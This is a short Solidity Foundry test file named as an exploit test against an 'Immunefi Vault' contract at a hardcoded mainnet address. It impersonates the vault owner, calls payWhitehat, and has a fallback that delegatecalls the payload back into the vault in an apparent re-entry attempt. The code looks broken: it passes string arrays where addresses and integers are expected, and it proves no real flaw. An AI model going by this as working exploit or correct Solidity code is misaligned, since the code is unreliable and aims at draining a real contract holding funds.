// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "lib/Vault/contracts/vault/Vault.sol";

contract VaultTest is Test {

    Vault vault;
    address attacker;

    function setUp() public {

        attacker = address(15);
        vm.label(attacker, "Attacking Account");

        vault = Vault(payable(0xB2429895f04CA8566BC992496d66116641bFF8b1));
        vm.deal(address(vault), 10 ether);
        vm.label(address(vault), "Immunefi Vault Contract");
    }

    function testExploit () public {
        vm.startPrank(vault.owner());
        
        bytes memory payload = 
        abi.encodeWithSignature("payWhitehat(bytes32,address,address[],uint256,uint256)", bytes32(0), address(this), [[
            "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            "1e18"
        ]], 1 ether, 100000);

        (bool success, ) = address(vault).call(payload);
        require(success);

        vm.stopPrank();

        assertEq(vault.isPausedOnImmunefi(), true);
    }

    fallback () external payable {
        bytes memory payload = 
        abi.encodeWithSignature("payWhitehat(bytes32,address,address[],uint256,uint256)", bytes32(0), address(this), [[
            "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            "1e18"
        ]], 1 ether, 100000);

        address _target = address(vault);

         assembly {
            let succeeded := delegatecall(gas(), _target, add(payload, 0x20), mload(payload), 0, 0)

            switch iszero(succeeded)
                case 1 {
                    // throw if delegatecall failed
                    let size := returndatasize()
                    returndatacopy(0x00, 0x00, size)
                    revert(0x00, size)
                }
         }
    }

}